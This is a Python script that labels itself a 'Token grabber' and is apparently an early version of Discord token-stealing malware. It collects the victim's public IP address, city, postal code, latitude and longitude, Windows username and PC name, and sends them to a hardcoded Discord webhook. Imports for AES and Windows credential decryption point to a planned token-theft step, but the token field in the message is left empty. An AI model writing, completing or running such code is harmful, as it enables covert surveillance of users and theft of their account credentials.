from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os
from datetime import datetime
import json
from urllib import request as r
from urllib.error import HTTPError
from time import sleep as s
import sys, platform

def systeme():
    systeme_exploitation = sys.platform
    SystemOS = platform.processor()
    return systeme_exploitation

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
print(s.getsockname()[0])
s.close()

WEBHOOK_URL = 'https://discord.com/api/webhooks/1242456274243686430/knPaXCoJ4zBjJLyGFDDCx6v3AQfBpaIxqSxUK5QvEGBpWrjglBZWOSRWfzBtwE1K0c6d'

headers = {
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Firefox/126.0.0.0 Safari/537.11'
    }
ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()

print(ip)

response = requests.get(f'http://ip-api.com/json/{ip}').json()
embed = f"""**Discovered :** 
            > :round_pushpin: __Localisation__ \n\tVille: `{response['city']}`\n\tCode Postal: `{response['zip']}`\n\tPosition -> latitude: `{response['lat']}` longitude: `{response['lon']}`\n
            > :desktop: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{os.getenv('UserName')}`\n\tPC Name: `{os.getenv('COMPUTERNAME')}`\n\tPlatform: `{systeme()}`\n
            > :piñata: __Token__\n\t\n"""

payload = {
    'content': embed, 'username': 'Token grabber - made by m1cr0_d0t'
}

req = Request(url=WEBHOOK_URL, data=json.dumps(payload).encode(), headers=headers, method='POST')
try:
    re = urlopen(req)
    print(re.status)
    print(re.status)
    print(re.status)
except HTTPError as e:
    print('ERROR')
    print(e.reason)
    print(e.hdrs)
    print(e.file.read())